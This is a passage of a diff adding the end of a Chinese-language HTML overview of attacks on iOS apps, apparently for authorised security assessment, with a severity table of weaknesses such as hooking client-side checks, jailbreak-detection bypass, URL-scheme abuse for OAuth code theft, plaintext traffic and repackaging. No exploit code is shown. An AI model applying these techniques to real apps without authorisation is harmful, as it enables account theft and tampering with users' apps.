+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>Hook 客户端校验 <span style="color:#20c997">(4b)</span></td>
+        <td>绕过登录、风控、次数限制、License 校验（客户端层面）</td>
+        <td>受影响的业务逻辑</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>内网地址 / UAT 泄露 <span style="color:#4d96ff">(1c)</span></td>
+        <td>从移动端打进内网，测试环境往往防护更弱</td>
+        <td>内网资产</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>越狱 / 反调试绕过 <span style="color:#20c997">(4e)</span></td>
+        <td>客户端所有安全检测形同虚设，为后续攻击铺路</td>
+        <td>越狱设备</td>
+        <td class="sev" style="color:#ffd93d">🟡 中</td>
+      </tr>
+      <tr>
+        <td>URL Scheme 无校验 <span style="color:#4d96ff">(1d)</span></td>
+        <td>被任意 App 拉起传参，OAuth 授权码窃取、越权跳转</td>
+        <td>全量用户</td>
+        <td class="sev" style="color:#ffd93d">🟡 中</td>
+      </tr>
+      <tr>
+        <td>第三方库旧版本 <span style="color:#cc5de8">(2d)</span></td>
+        <td>利用已知 CVE 直接攻击 App 进程</td>
+        <td>视 CVE 而定</td>
+        <td class="sev" style="color:#ffd93d">🟡 中</td>
+      </tr>
+      <tr>
+        <td>明文 HTTP 传输 <span style="color:#4d96ff">(1a)</span></td>
+        <td>ATS 全局关闭 = 所有流量可被中间人，无需绕过 Pin</td>
+        <td>全量用户</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>二进制可被篡改 <span style="color:#ff922b">(3a/3b)</span></td>
+        <td>无完整性校验 → 任意第三方可重打包分发（投毒前提）</td>
+        <td>全量用户</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="footer">
+  iOS IPA 攻击全流程全景图 · 全程追踪示例：TargetApp.ipa (com.example.bankwallet v3.2.1)<br>
+  ⚠️ 本文档仅用于<strong>授权范围内</strong>的移动应用安全评估与防御加固，所有技术细节请勿用于未授权目标。
+</div>
+
+</body>
+</html>
